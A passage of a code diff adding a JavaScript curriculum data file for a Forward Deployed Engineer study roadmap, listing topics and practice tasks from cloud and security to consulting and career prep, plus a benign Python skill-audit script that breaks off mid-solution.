+    {id:"cloud-concepts",name:"Cloud Computing Fundamentals & Architecture",desc:"IaaS vs PaaS vs SaaS, public cloud vs on-premise, regions, availability zones, VPCs, and the shared responsibility model.",level:"beginner",subtopics:["IaaS / PaaS / SaaS","Regions & Availability Zones","Shared Responsibility Model","On-Prem vs Cloud","Cost Management"],resources:[{label:"AWS Free Tier",url:"https://aws.amazon.com/free/"}]},
+    {id:"cloud-core",name:"Core Cloud Services (Compute, Storage, IAM)",desc:"Virtual machines (EC2/GCE), object storage (S3/GCS), identity and access management (IAM roles/policies), and security groups.",level:"essential",subtopics:["Compute (EC2/GCE)","Storage (S3/GCS)","IAM Roles & Policies","Security Groups & Firewalls","VPC Subnets & Gateways"],resources:[]},
+    {id:"docker",name:"Docker Containerization & Docker Compose",desc:"Docker images, multi-stage Dockerfiles, containers, volumes, networking, environment variables, and Docker Compose for local environments.",level:"essential",subtopics:["Dockerfile Best Practices","docker build & run","Multi-Stage Builds","Docker Compose","Volumes & Storage","Container Registries"],resources:[{label:"Docker Getting Started",url:"https://docs.docker.com/get-started/"}]},
+    {id:"kubernetes-basics",name:"Kubernetes Basics & Container Orchestration",desc:"Pods, Deployments, Services, ConfigMaps, Secrets, namespaces, kubectl CLI commands, and Helm package charts.",level:"recommended",subtopics:["Pods & Nodes","Deployments & ReplicaSets","Cluster Services","ConfigMaps & Secrets","kubectl CLI","Helm Charts"],resources:[]},
+    {id:"cicd",name:"CI/CD Pipelines (GitHub Actions)",desc:"Continuous Integration & Continuous Deployment: automated test suites, linting, Docker image building, and deployment triggers.",level:"essential",subtopics:["GitHub Actions Workflows","Automated Testing in CI","Docker Build & Push","Deployment Triggers","Secrets Management"],resources:[]},
+    {id:"iac",name:"Infrastructure as Code (Terraform / Pulumi)",desc:"Provisioning repeatable cloud infrastructure via code: declarative HCL syntax, state files, plan and apply workflows, and drift detection.",level:"advanced",subtopics:["Terraform Fundamentals","HCL Syntax","State Files & Remote Backends","Plan & Apply Workflow","Modules"],resources:[]}
+  ],
+  tasks: [
+    {id:"t-cloud-1",title:"Multi-Stage Dockerfile & Docker Compose Stack",level:"beginner",est:"2h",desc:"Package a full-stack Python/Node app into a lightweight multi-stage Dockerfile (<150MB). Write a docker-compose.yml running the app and a Postgres database."},
+    {id:"t-cloud-2",title:"Automated CI/CD Workflow with GitHub Actions",level:"intermediate",est:"2.5h",desc:"Create a GitHub Actions workflow that runs linting, unit tests, builds a Docker image on PR approval, and pushes to a container registry."},
+    {id:"t-cloud-3",title:"Deploy a Containerized Web App to Cloud (AWS/GCP)",level:"intermediate",est:"3h",desc:"Provision a cloud instance or serverless container service (AWS ECS/App Runner or GCP Cloud Run), configure HTTPS domain, and manage environment secrets."}
+  ]
+},
+
+// 11. NETWORKING & PROTOCOLS
+{
+  id: "networking",
+  title: "11. Networking & Protocols",
+  subtitle: "Debug connectivity, firewalls, and proxy issues within secure client enterprise networks",
+  icon: "🌐",
+  color: "#14b8a6",
+  topics: [
+    {id:"net-basics",name:"Networking Fundamentals (IP, DNS, Ports, Routers)",desc:"IPv4/IPv6, subnetting, DNS resolution process, TCP/UDP transport layers, ports (80, 443, 22), NAT, and routers.",level:"beginner",subtopics:["IP Addresses & Subnets","DNS Resolution","TCP vs UDP","Ports & Sockets","LAN vs WAN","Routing & NAT"],resources:[]},
+    {id:"http-protocol",name:"HTTP/1.1, HTTP/2, HTTP/3 & WebSockets",desc:"HTTP request-response cycle, HTTP/2 multiplexing, HTTP/3 QUIC, persistent WebSockets, and Server-Sent Events (SSE).",level:"essential",subtopics:["HTTP Methods & Headers","HTTP/2 Multiplexing","HTTP/3 QUIC","WebSockets Protocol","Server-Sent Events (SSE)"],resources:[]},
+    {id:"tls-https",name:"TLS/HTTPS, SSL Certificates & mTLS",desc:"Asymmetric encryption, TLS handshake, SSL certificate authorities, Let's Encrypt, mutual TLS (mTLS) for zero-trust security.",level:"essential",subtopics:["TLS Handshake","Public / Private Keys","SSL Certificates","mTLS (Mutual TLS)","Certificate Authority (CA)"],resources:[]},
+    {id:"proxies-lb",name:"Reverse Proxies, Nginx & Load Balancing",desc:"Forward vs reverse proxies, Nginx configuration, load balancing algorithms (round robin, least connections), CDNs, and CORS headers.",level:"recommended",subtopics:["Reverse Proxy Concept","Nginx Configuration","Load Balancing Algorithms","CORS Headers","CDN Caching"],resources:[]}
+  ],
+  tasks: [
+    {id:"t-net-1",title:"Network Diagnostic Toolkit Lab (curl, dig, traceroute, netstat)",level:"beginner",est:"1.5h",desc:"Troubleshoot 4 simulated network problems: verify DNS lookup chains with dig, inspect raw TLS handshakes with curl -Iv, and inspect open ports with netstat/lsof."},
+    {id:"t-net-2",title:"Configure Nginx Reverse Proxy with SSL & Rate Limiting",level:"intermediate",est:"2.5h",desc:"Set up an Nginx reverse proxy distributing requests between two backend instances with self-signed SSL/TLS, gzip compression, and rate limiting."},
+    {id:"t-net-3",title:"Build a Real-Time WebSocket Channel with Reconnect Logic",level:"intermediate",est:"2.5h",desc:"Create a client-server WebSocket application with heartbeat ping-pong, automatic exponential reconnection on network drop, and status indicators."}
+  ]
+},
+
+// 12. SECURITY & COMPLIANCE
+{
+  id: "security",
+  title: "12. Security & Compliance",
+  subtitle: "Enterprise clients demand airtight security — OWASP, RBAC, encryption & compliance",
+  icon: "🔒",
+  color: "#ef4444",
+  topics: [
+    {id:"sec-basics",name:"Security Mindset & Principle of Least Privilege",desc:"Defense-in-depth, least privilege access, threat modeling, attack surfaces, and secure credential handling.",level:"beginner",subtopics:["Security Mindset","Least Privilege","Attack Surface","Threat Modeling","Secrets Management"],resources:[{label:"OWASP Top 10",url:"https://owasp.org/www-project-top-ten/"}]},
+    {id:"sec-web",name:"OWASP Top 10 Vulnerabilities & Prevention",desc:"SQL Injection, Cross-Site Scripting (XSS), CSRF, Server-Side Request Forgery (SSRF), broken authentication, and parameterized queries.",level:"essential",subtopics:["SQL Injection","XSS (Stored / Reflected)","CSRF Protection","SSRF","Parameterized Queries","Content Security Policy (CSP)"],resources:[]},
+    {id:"sec-auth",name:"Enterprise Authentication (SSO, SAML, RBAC)",desc:"Single Sign-On (SSO), SAML 2.0, OpenID Connect (OIDC), Role-Based Access Control (RBAC), and Attribute-Based Access Control (ABAC).",level:"essential",subtopics:["Enterprise SSO","SAML 2.0","OpenID Connect (OIDC)","RBAC (Roles & Permissions)","ABAC (Attribute-Based)","Multi-Factor Auth (MFA)"],resources:[]},
+    {id:"sec-data",name:"Data Encryption & Secrets Management",desc:"Encryption at rest (AES-256), encryption in transit (TLS 1.3), KMS key rotation, PII data masking, and secrets management (HashiCorp Vault).",level:"recommended",subtopics:["Encryption at Rest","Encryption in Transit","KMS Keys","PII Data Masking","Secrets Vaults","Hashing vs Encryption"],resources:[]},
+    {id:"sec-compliance",name:"Compliance Frameworks (SOC2, HIPAA, GDPR, FedRAMP)",desc:"Understanding enterprise compliance certifications, audit logging, data residency, retention policies, and security questionnaires.",level:"recommended",subtopics:["SOC2 Type I & II","HIPAA Compliance","GDPR & Privacy","FedRAMP Standards","Audit Trails & Logging"],resources:[]}
+  ],
+  tasks: [
+    {id:"t-sec-1",title:"Exploit & Patch 3 OWASP Vulnerabilities in a Lab App",level:"intermediate",est:"3h",desc:"Identify SQL Injection, XSS, and broken access control in an intentionally vulnerable app. Write exploit proofs, then patch each vulnerability."},
+    {id:"t-sec-2",title:"Implement Role-Based Access Control (RBAC) Middleware",level:"intermediate",est:"3h",desc:"Build an authentication and authorization layer with Admin, Editor, and Viewer roles, testing that unauthorized API calls are blocked with 403 Forbidden."},
+    {id:"t-sec-3",title:"Draft an Enterprise Security & SOC2 Compliance Brief",level:"intermediate",est:"2h",desc:"Complete a simulated 20-question enterprise vendor security questionnaire detailing encryption, backup retention, incident SLAs, and access controls."}
+  ]
+},
+
+// 13. DATA ANALYSIS & VISUALIZATION
+{
+  id: "data-viz",
+  title: "13. Data Analysis & Visualization",
+  subtitle: "Turn messy client datasets into actionable visual insights and executive-ready dashboards",
+  icon: "📊",
+  color: "#8b5cf6",
+  topics: [
+    {id:"data-analysis",name:"Exploratory Data Analysis (EDA) Fundamentals",desc:"Summary statistics, distributions, outlier detection, correlation analysis, hypothesis validation, and data profiling.",level:"essential",subtopics:["Descriptive Statistics","Distributions & Skewness","Outlier Detection","Correlation Matrices","Data Quality Profiling"],resources:[]},
+    {id:"viz-python",name:"Python Visualization (Matplotlib, Seaborn, Plotly)",desc:"Static charts (Matplotlib), statistical distributions (Seaborn), and interactive web charts (Plotly) for analytical exploration.",level:"recommended",subtopics:["Matplotlib Basics","Seaborn Statistical Plots","Plotly Interactive Charts","Heatmaps & Boxplots","Subplots & Layouts"],resources:[]},
+    {id:"viz-js",name:"Frontend Data Viz (Recharts, Chart.js, D3)",desc:"Embedding charts in client dashboards: line charts, bar graphs, heatmaps, responsive tooltips, and time-series axes.",level:"recommended",subtopics:["Recharts in React","Chart.js","D3.js Core Concepts","Time-Series Scaling","Responsive Chart Layouts"],resources:[]},
+    {id:"data-storytelling",name:"Data Storytelling & Executive Presentations",desc:"Structuring data narratives: problem context, quantitative evidence, root cause analysis, business impact, and recommendations.",level:"essential",subtopics:["Narrative Arc","Avoiding Misleading Visuals","Executive Summaries","Action-Oriented Insights","Chart Selection Guide"],resources:[]}
+  ],
+  tasks: [
+    {id:"t-viz-1",title:"Jupyter Notebook EDA on a Client Business Dataset",level:"beginner",est:"2.5h",desc:"Clean a raw dataset, generate distribution histograms, correlation heatmaps with Seaborn/Plotly, and summarize 5 key takeaways in markdown."},
+    {id:"t-viz-2",title:"Build an Interactive Client KPI Dashboard with Recharts",level:"intermediate",est:"3h",desc:"Build a responsive React analytics dashboard with time-range filtering, comparison delta metrics, and tooltips using Recharts."},
+    {id:"t-viz-3",title:"Create a 5-Slide Data Storytelling Deck for Leadership",level:"intermediate",est:"2h",desc:"Analyze a simulated client operational slowdown. Build a 5-slide presentation showing problem proof, root cause, and 3 prioritized solutions."}
+  ]
+},
+
+// 14. ML & AI FOUNDATIONS
+{
+  id: "ml-ai",
+  title: "14. ML & AI Foundations",
+  subtitle: "Configure, integrate, and deploy AI/ML models & LLMs at modern enterprise client engagements",
+  icon: "🤖",
+  color: "#ec4899",
+  topics: [
+    {id:"ml-concepts",name:"Machine Learning Core Concepts",desc:"Supervised vs unsupervised learning, classification vs regression, training vs inference, overfitting/underfitting, and evaluation metrics.",level:"recommended",subtopics:["Supervised & Unsupervised","Classification & Regression","Training vs Inference","Train / Test Split","Precision, Recall, F1, ROC-AUC"],resources:[{label:"Google ML Crash Course",url:"https://developers.google.com/machine-learning/crash-course"}]},
+    {id:"ml-tools",name:"Scikit-Learn & Feature Engineering",desc:"Data preprocessing, one-hot encoding, feature scaling, model training (Random Forest, Logistic Regression), and pipeline validation.",level:"recommended",subtopics:["scikit-learn Pipelines","Feature Encoding","StandardScaler","Model Evaluation","Cross-Validation"],resources:[]},
+    {id:"llm-integration",name:"LLMs, Prompt Engineering & RAG Pipelines",desc:"Integrating LLMs (OpenAI, Anthropic), prompt engineering, chunking strategies, vector embeddings, and Retrieval-Augmented Generation (RAG).",level:"recommended",subtopics:["LLM APIs","Prompt Engineering","Vector Embeddings","Vector DBs (pgvector, Pinecone)","RAG Architecture","Chunking Strategies"],resources:[]},
+    {id:"ml-ops",name:"MLOps & Model Deployment Basics",desc:"Model serving, inference latency, drift monitoring, versioning models with MLflow, and monitoring output hallucinations.",level:"advanced",subtopics:["Model Serving APIs","Inference Latency","Data Drift Monitoring","MLflow","Guardrails & Safety"],resources:[]}
+  ],
+  tasks: [
+    {id:"t-ml-1",title:"Train & Evaluate a Churn Prediction Model in Scikit-Learn",level:"beginner",est:"2.5h",desc:"Build an end-to-end classification pipeline: preprocess categorical features, train a Random Forest model, and evaluate with confusion matrix and ROC-AUC."},
+    {id:"t-ml-2",title:"Build a Production RAG Knowledge Search with pgvector",level:"intermediate",est:"4h",desc:"Ingest 20 client markdown docs, chunk text, generate vector embeddings, store in pgvector/Chroma, and build a question-answering CLI with citation links."},
+    {id:"t-ml-3",title:"Build an LLM Structured Entity Extraction Pipeline",level:"intermediate",est:"2.5h",desc:"Build an API endpoint that takes unstructured customer emails, calls an LLM with strict JSON schema constraints, and returns verified structured entities."}
+  ]
+},
+
+// 15. OBSERVABILITY & MONITORING
+{
+  id: "observability",
+  title: "15. Observability & Monitoring",
+  subtitle: "Diagnose and resolve client production incidents in real time using logs, metrics & traces",
+  icon: "🔍",
+  color: "#0ea5e9",
+  topics: [
+    {id:"logging",name:"Structured Logging & Log Aggregation",desc:"Structured JSON logs, log levels (DEBUG, INFO, WARN, ERROR), correlation IDs for tracing requests, and log collectors (ELK, Datadog).",level:"essential",subtopics:["Structured JSON Logs","Log Levels & Best Practices","Correlation IDs","Centralized Log Aggregation","Log Parsing & Alerting"],resources:[]},
+    {id:"metrics",name:"Metrics, Dashboards & Alerting (Prometheus, Grafana)",desc:"Application metrics (counters, gauges, histograms), RED method (Rate, Errors, Duration), SLIs, SLOs, SLAs, and Grafana dashboards.",level:"recommended",subtopics:["Prometheus Metrics","Grafana Dashboards","RED & USE Methods","SLIs / SLOs / SLAs","PagerDuty Alerting Rules"],resources:[]},
+    {id:"tracing",name:"Distributed Tracing (OpenTelemetry)",desc:"Tracing requests across microservices: spans, parent-child traces, latency bottlenecks, and OpenTelemetry instrumentation.",level:"advanced",subtopics:["OpenTelemetry Standard","Spans & Traces","Distributed Context Propagation","Jaeger / Zipkin","Latency Waterfall Analysis"],resources:[]},
+    {id:"incident",name:"Incident Response, Runbooks & Blameless Postmortems",desc:"Production incident response: severity triage, war rooms, stakeholder communication, runbooks, and blameless postmortem reports.",level:"essential",subtopics:["Incident Severity (SEV1-SEV3)","War Room Management","Runbooks & SOPs","Root Cause Analysis (5 Whys)","Blameless Postmortems"],resources:[]}
+  ],
+  tasks: [
+    {id:"t-obs-1",title:"Instrument a Backend Service with Structured Logs & Trace IDs",level:"beginner",est:"2h",desc:"Implement structured JSON logging with custom middleware in Python or Node.js where every HTTP request receives and propagates an X-Trace-ID."},
+    {id:"t-obs-2",title:"Set Up Prometheus Metrics & a Grafana Dashboard",level:"intermediate",est:"3h",desc:"Expose /metrics endpoint tracking HTTP request count, error count, and response latency. Build a Grafana dashboard with alerting rules."},
+    {id:"t-obs-3",title:"Run a Simulated Incident War Room & Write a Blameless Postmortem",level:"intermediate",est:"2.5h",desc:"Simulate a 45-minute client outage. Write out the incident timeline, conduct a 5 Whys root cause analysis, and draft 4 preventative action items."}
+  ]
+},
+
+// 16. SYSTEM DESIGN
+{
+  id: "sys-design",
+  title: "16. System Design",
+  subtitle: "Architect scalable, reliable systems — essential for FDE interviews & enterprise deployments",
+  icon: "🏗️",
+  color: "#f97316",
+  topics: [
+    {id:"sd-fundamentals",name:"System Design Fundamentals & Scaling",desc:"Horizontal vs vertical scaling, load balancers, caching strategies (cache-aside, write-through), CAP theorem, and eventual consistency.",level:"essential",subtopics:["Horizontal vs Vertical","Load Balancing","Caching Strategies (Redis)","CAP Theorem","Eventual Consistency","Database Sharding"],resources:[{label:"System Design Primer",url:"https://github.com/donnemartin/system-design-primer"}]},
+    {id:"sd-patterns",name:"Architecture Patterns (Monolith, Microservices, Event-Driven)",desc:"Trade-offs between modular monoliths and microservices, event-driven architecture, message queues (RabbitMQ, SQS), and API gateways.",level:"recommended",subtopics:["Modular Monolith vs Microservices","Event-Driven Architecture","Message Queues (SQS/RabbitMQ)","API Gateway Pattern","CQRS Basics"],resources:[]},
+    {id:"sd-estimation",name:"Back-of-the-Envelope Estimation",desc:"Estimating throughput, QPS, storage growth, network bandwidth, memory, and database IOPS to make informed design decisions.",level:"recommended",subtopics:["QPS & Throughput","Storage Capacity Planning","Bandwidth Calculations","Memory Sizing","Latency Numbers Every Programmer Should Know"],resources:[]},
+    {id:"sd-examples",name:"Classic Enterprise System Design Problems",desc:"Designing high-throughput ingestion pipelines, audit logging systems, notification engines, and multi-tenant SaaS architectures.",level:"recommended",subtopics:["High-Throughput Ingestion","Audit Logging System","Notification Dispatcher","Rate Limiter Service","Multi-Tenant Platform"],resources:[{label:"System Design Interview Book",url:"https://www.amazon.com/System-Design-Interview-insiders-Second/dp/B08CMF2CQF"}]}
+  ],
+  tasks: [
+    {id:"t-sd-1",title:"Complete 3 Back-of-the-Envelope Capacity Estimations",level:"beginner",est:"1.5h",desc:"Calculate daily storage, average/peak QPS, network bandwidth, and memory cache requirements for an IoT telemetry service handling 50M events/day."},
+    {id:"t-sd-2",title:"Design an Enterprise Ingestion & Audit Pipeline (Architecture Diagram)",level:"intermediate",est:"3h",desc:"Draw an architecture diagram (Mermaid/Excalidraw) for a multi-tenant client data platform: API gateway, queues, worker pool, database partitioning, and cold storage."},
+    {id:"t-sd-3",title:"Mock System Design Interview: Distributed Rate Limiter",level:"intermediate",est:"2.5h",desc:"Write an end-to-end design doc for a distributed rate limiter: token bucket algorithm, Redis sliding window counter, failure fallbacks, and multi-region sync."}
+  ]
+},
+
+// 17. PLATFORM & PRODUCT KNOWLEDGE
+{
+  id: "platform",
+  title: "17. Platform & Product Knowledge",
+  subtitle: "Ramp up on your company's product in record time and configure it to client requirements",
+  icon: "🧩",
+  color: "#a855f7",
+  topics: [
+    {id:"platform-learning",name:"Learning Any Platform / Codebase in 48 Hours",desc:"Techniques to quickly unpack large unfamiliar codebases: entry point discovery, tracing data models, running integration tests, and building toy demos.",level:"essential",subtopics:["Codebase Reconnaissance","Tracing Entry Points","Data Model Mapping","Running Integration Tests","Building Toy Apps","Reading Release Notes"],resources:[]},
+    {id:"platform-deep",name:"Deep Product Expertise & Edge Cases",desc:"Knowing product capabilities, configuration flags, performance boundaries, known quirks, and API capabilities better than anyone else.",level:"essential",subtopics:["Configuration Options","Feature Flags","Performance Limits","Common Failure Modes","Public & Internal APIs"],resources:[]},
+    {id:"platform-customization",name:"Custom Workflows, Extensions & Plugins",desc:"Extending platforms with client-specific connectors, bespoke workflows, webhook actions, theme customization, and plugin architectures.",level:"essential",subtopics:["Plugin Architectures","Custom Connectors","Workflow Automation","Tenant Isolation","Custom UI Extensions"],resources:[]},
+    {id:"platform-integration",name:"Platform Enterprise Integration Patterns",desc:"Integrating the core platform with client enterprise identity (Okta/Ping), data lakes, legacy on-prem databases, and ticketing systems.",level:"essential",subtopics:["Identity Provider Sync","Data Lake Federation","Legacy DB Connectors","Jira / ServiceNow Sync","Embedded Widgets"],resources:[]}
+  ],
+  tasks: [
+    {id:"t-plat-1",title:"Rapid Ramp-Up: Deconstruct an Open-Source Platform in 4h",level:"beginner",est:"4h",desc:"Select an unfamiliar tool (e.g. Supabase, Metabase, Airbyte, or Grafana). Install locally, trace its core architecture, and build a functioning demo."},
+    {id:"t-plat-2",title:"Build a Custom Plugin / Connector for a Platform",level:"intermediate",est:"3.5h",desc:"Develop a custom data connector or plugin (e.g. custom Airbyte source, Grafana panel, or Slack bot integration) with clean configuration and tests."},
+    {id:"t-plat-3",title:"Write a Comprehensive Client Deployment & Configuration Spec",level:"intermediate",est:"2.5h",desc:"Draft a step-by-step technical deployment guide detailing prerequisite network ports, SSO configurations, database sizing, and health check validation."}
+  ]
+},
+
+// 18. CLIENT-FACING & CONSULTING SKILLS
+{
+  id: "consulting",
+  title: "18. Client-Facing & Consulting Skills",
+  subtitle: "The defining FDE differentiator — stakeholder management, discovery, demos & communication",
+  icon: "🤝",
+  color: "#f59e0b",
+  topics: [
+    {id:"client-communication",name:"Client Communication Fundamentals",desc:"Setting expectations, transparent timelines, active listening, structured written updates, and translating technical jargon to business impact.",level:"beginner",subtopics:["Expectation Setting","Under-Promise Over-Deliver","Active Listening","Executive Summaries","Follow-Up Discipline"],resources:[]},
+    {id:"stakeholder",name:"Stakeholder Management & Org Mapping",desc:"Identifying executive sponsors, technical champions, operational end-users, and potential skeptics. Navigating enterprise organizational politics.",level:"essential",subtopics:["Champion Identification","Blocker Mitigation","Org Chart Mapping","Executive Presence","Escalation Protocols"],resources:[]},
+    {id:"requirements",name:"Technical Discovery & Scope Negotiation",desc:"Running discovery interviews, distilling ambiguous business requests into technical specs, MoSCoW prioritization, and avoiding scope creep.",level:"essential",subtopics:["Discovery Interviewing","Ambiguity Resolution","MoSCoW Prioritization","Scope Management","Acceptance Criteria"],resources:[]},
+    {id:"presentations",name:"Technical Demos & Live Whiteboarding",desc:"Preparing rock-solid client demos, setting up staging environments, planning fallback videos, whiteboarding system architectures, and handling Q&A.",level:"essential",subtopics:["Live Demo Discipline","Backup Demo Environments","Whiteboarding Techniques","Story-Driven Presentations","Handling Tough Questions"],resources:[]},
+    {id:"technical-writing",name:"Technical Writing & Runbooks",desc:"Writing client-facing integration manuals, Architecture Decision Records (ADRs), operator runbooks, and self-service troubleshooting guides.",level:"essential",subtopics:["Architecture Decision Records","Deployment Runbooks","Troubleshooting Guides","API Reference Docs","Release Bulletins"],resources:[]}
+  ],
+  tasks: [
+    {id:"t-con-1",title:"Conduct a Mock Client Discovery & Scope Definition Session",level:"beginner",est:"2h",desc:"Write a 10-question discovery interview script for an ambiguous enterprise problem. Draft a technical scoping document with explicit in-scope/out-of-scope bounds."},
+    {id:"t-con-2",title:"Draft an Architecture Decision Record (ADR) for a Client Migration",level:"intermediate",est:"2h",desc:"Write a formal ADR comparing two integration patterns (Batch SFTP vs Real-Time Webhooks) detailing context, decision, consequences, and timeline."},
+    {id:"t-con-3",title:"Deliver a 10-Minute Recorded Technical Architecture Demo",level:"intermediate",est:"2.5h",desc:"Prepare and record a 10-minute demo: 2m business context, 5m live product workflow, 3m architecture diagram walkthrough, with demo contingency notes."}
+  ]
+},
+
+// 19. DOMAIN KNOWLEDGE & INDUSTRY AWARENESS
+{
+  id: "domain",
+  title: "19. Domain Knowledge & Industry Awareness",
+  subtitle: "Understand client industry verticals: Defense, Government, Healthcare, Fintech & Enterprise",
+  icon: "🏢",
+  color: "#84cc16",
+  topics: [
+    {id:"domain-learn",name:"How to Master an Industry Vertical Fast",desc:"Deconstructing industry value chains, reading annual 10-K filings, learning industry jargon, understanding revenue drivers, and compliance constraints.",level:"essential",subtopics:["Value Chain Analysis","10-K & Financial Filings","Domain Terminology","Regulatory Landscape","Customer Workflows"],resources:[]},
+    {id:"domain-fintech",name:"Financial Services & Fintech",desc:"Core banking systems, trading desks, settlement ledgers, payment rails (ACH, FedNow, SWIFT), fraud detection, and regulatory reporting (KYC/AML).",level:"recommended",subtopics:["Payment Rails","Core Banking & Ledgers","Fraud & Risk Scoring","KYC / AML Compliance","Latency Requirements"],resources:[]},
+    {id:"domain-healthcare",name:"Healthcare & Life Sciences",desc:"Electronic Health Records (EHR/EMR), clinical trial data pipelines, healthcare interoperability standards (HL7, FHIR), and HIPAA data privacy.",level:"recommended",subtopics:["EHR / EMR Integrations","HL7 & FHIR Standards","Clinical Trial Pipelines","HIPAA Privacy Rules","PHI De-Identification"],resources:[]},
+    {id:"domain-defense",name:"Defense, Intelligence & Government",desc:"Air-gapped and SCIF environments, ITAR compliance, security clearances, geospatial intelligence (GIS), sensor data, and FedRAMP standards.",level:"advanced",subtopics:["Air-Gapped Deployments","ITAR & Security Clearances","FedRAMP Standards","Geospatial Intelligence","Sensor Ingestion"],resources:[]},
+    {id:"domain-enterprise",name:"Enterprise SaaS & Supply Chain",desc:"ERP systems (SAP, Oracle), inventory management, supply chain visibility, multi-tenancy models, and procurement cycles.",level:"essential",subtopics:["ERP Integration","Supply Chain Data","Multi-Tenant Architecture","Enterprise Procurement","SLA Guarantees"],resources:[]}
+  ],
+  tasks: [
+    {id:"t-dom-1",title:"Analyze a Fortune 500 Enterprise 10-K for Technical Pain Points",level:"beginner",est:"2h",desc:"Read the business & risk factors of a public company's 10-K filing. Map out 3 strategic initiatives where an embedded FDE deployment would deliver ROI."},
+    {id:"t-dom-2",title:"Design an Air-Gapped or Regulated Data Architecture Flow",level:"intermediate",est:"2.5h",desc:"Draw an architecture diagram illustrating data ingestion in an air-gapped or HIPAA/PCI-compliant zone with de-identification and audit logging."},
+    {id:"t-dom-3",title:"Create a Domain Glossary & Workflow Map for an Industry",level:"beginner",est:"1.5h",desc:"Select an industry (Fintech, Healthcare, or Defense). Create a 25-term technical glossary and diagram the typical end-to-end data lifecycle."}
+  ]
+},
+
+// 20. SOFT SKILLS & CAREER GROWTH
+{
+  id: "soft",
+  title: "20. Soft Skills, Career Growth & Interview Prep",
+  subtitle: "Ace the FDE interview loop, build an impressive portfolio & advance your career",
+  icon: "🌱",
+  color: "#10b981",
+  topics: [
+    {id:"learning-fast",name:"Rapid Learning & Unblocking Yourself",desc:"Developing an aggressive learning feedback loop: read docs → inspect code → build prototypes → solicit feedback. The #1 FDE superpower.",level:"essential",subtopics:["Rapid Prototyping","Deliberate Practice","Time-Boxed Research","Asking High-Leverage Questions","Note-Taking Systems"],resources:[]},
+    {id:"interview-prep",name:"FDE Interview Structure & Preparation",desc:"The standard FDE interview loop: LeetCode medium coding, live system design, client case study scenario, behavioral (STAR method), and take-homes.",level:"essential",subtopics:["LeetCode Medium Coding","System Design Interviews","Client Scenario Case Study","STAR Method Behavioral","Take-Home Challenges"],resources:[{label:"LeetCode",url:"https://leetcode.com"},{label:"TeamBlind",url:"https://www.teamblind.com"}]},
+    {id:"portfolio",name:"Building a Standout FDE Portfolio & GitHub",desc:"Showcasing end-to-end projects: data ingestion + API backend + interactive frontend dashboard + complete documentation and live demo.",level:"recommended",subtopics:["GitHub Project Polish","Live Deployed Demos","Architecture Diagrams in README","Technical Blog Posts","Quantified Project Impact"],resources:[]},
+    {id:"resume",name:"Resume & Application Strategy for FDE Roles",desc:"Structuring an FDE resume: highlighting client-facing impact, quantifiable metrics ($ saved, latency reduced), full-stack skills, and referral networking.",level:"essential",subtopics:["Quantifying Engineering Impact","Highlighting Client Work","ATS Formatting","Cover Letters","Referral Strategy"],resources:[]}
+  ],
+  tasks: [
+    {id:"t-soft-1",title:"Craft an Impact-Driven FDE Resume with Quantified Metrics",level:"beginner",est:"2h",desc:"Revamp your resume to emphasize FDE competencies: quantify technical and client outcomes (e.g. 'Reduced ETL latency by 45%, unlocking $1.2M contract expansion')."},
+    {id:"t-soft-2",title:"Prepare 6 STAR Method Stories for Behavioral & Client Scenarios",level:"beginner",est:"2h",desc:"Draft 6 structured STAR stories covering: resolving a production outage under client pressure, handling conflicting requirements, and mastering unfamiliar tech."},
+    {id:"t-soft-3",title:"Complete a 48-Hour Full-Stack FDE Take-Home Capstone",level:"intermediate",est:"6h",desc:"Build an end-to-end capstone: data ingestion script, typed API service, responsive React dashboard, Dockerfile, architecture diagram, and client-facing README."}
+  ]
+}
+];
+
+const TASK_DETAILS = {
+  "t-start-1": {
+    conceptPrimer: `The FDE role requires a dual competency: Deep Full-Stack/Data Engineering + High-Empathy Client Consulting.\n- Technical Base: Systems programming (Python/Go), data pipelines, cloud infrastructure, and databases.\n- Field Skills: Rapid prototyping, stakeholder discovery, live debugging in client air-gapped environments, and scope negotiation.\n- 6-Month Plan: Dedicate 12-15 hours/week organized into 2-week bi-weekly sprints.`,
+    scenario: "Career Transition Milestone: You are transitioning into an enterprise Forward Deployed Engineer role (Palantir/Anduril/Scale AI). You need an objective, quantified baseline audit of your technical gaps and a milestone schedule.",
+    starterSnippet: `# FDE Baseline Skill Audit Template
+# Rate your confidence from 0 (No knowledge) to 5 (Production expert)
+
+SKILL_AUDIT = {
+    "Computer Science & Data Structures": 2,
+    "Linux CLI & Shell Automation": 2,
+    "Git & Branching Workflows": 3,
+    "Python & Scripting": 2,
+    "JavaScript / TypeScript": 4,
+    "React & Next.js": 4,
+    "SQL & Relational Databases": 2,
+    "Data Pipelines & ETL": 1,
+    "API Design & Webhooks": 3,
+    "Docker & Cloud Deployment": 2,
+    "Observability & Production Debugging": 1,
+    "Client Discovery & Consulting": 2
+}
+
+def generate_study_plan(audit_scores):
+    # TODO: Calculate average score, identify critical gaps (< 3),
+    # and map them into a 24-week milestone roadmap.
+    pass
+
+if __name__ == "__main__":
+    generate_study_plan(SKILL_AUDIT)`,
+    steps: [
+      "1. Fill in your genuine self-assessment ratings (0-5) across the 12 FDE core competencies.",
+      "2. Write logic to identify critical gap areas (competencies scoring below 3.0).",
+      "3. Group gap areas into three 8-week sequential milestones: Foundations -> Infrastructure/Data -> Client Field Execution.",
+      "4. Execute the script to generate your personalized study schedule and weekly hour budget."
+    ],
+    solutionSnippet: `#!/usr/bin/env python3
+import json
+from datetime import datetime, timedelta
+
+SKILL_AUDIT = {
+    "Computer Science & Data Structures": 2,
+    "Linux CLI & Shell Automation": 2,
+    "Git & Branching Workflows": 3,
+    "Python & Scripting": 2,
+    "JavaScript / TypeScript": 4,
+    "React & Next.js": 4,
+    "SQL & Relational Databases": 2,
+    "Data Pipelines & ETL": 1,
+    "API Design & Webhooks": 3,
+    "Docker & Cloud Deployment": 2,
+    "Observability & Production Debugging": 1,
+    "Client Discovery & Consulting": 2
+}
+
+def generate_study_plan(audit):
+    total_skills = len(audit)
+    avg_score = round(sum(audit.values()) / total_skills, 2)
+    
+    # Priority gaps: anything under 3/5
+    critical_gaps = [k for k, v in audit.items() if v < 3]
+    strengths = [k for k, v in audit.items() if v >= 4]
+    
+    start_date = datetime.now()
+    milestones = [
+        {
+            "phase": "Phase 1: Backend, SQL & Data Foundations",
+            "weeks": "Weeks 1 - 8 (12 hrs/wk = 96 hrs)",
+            "deadline": (start_date + timedelta(weeks=8)).strftime("%Y-%m-%d"),
+            "focus_areas": ["Python Scripting & Pytest", "SQL Window Functions & Indexing", "Batch ETL Pipelines"]
+        },
+        {
+            "phase": "Phase 2: Cloud, Systems & Distributed Services",
+            "weeks": "Weeks 9 - 16 (12 hrs/wk = 96 hrs)",
